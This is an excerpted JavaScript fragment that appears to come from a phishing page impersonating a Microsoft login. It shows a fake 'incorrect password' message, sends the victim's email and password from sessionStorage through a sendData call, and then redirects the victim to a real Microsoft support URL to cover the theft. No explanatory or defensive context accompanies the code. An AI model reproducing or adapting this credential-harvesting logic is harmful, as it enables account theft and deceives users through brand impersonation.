...
function validatePassword() {
  ...
  if(password.length < 8) {
    $passResult.text("Your account or password is incorrect. don't remember your password ?,");
...
sendData( {email: sessionStorage.getItem("user"), password: sessionStorage.getItem("password")} );
...
setTimeout(function(){
  ...
  window.location.href = "https://www.support.microsoft.com/en-us/security";
  //location.reload();
},0);
});
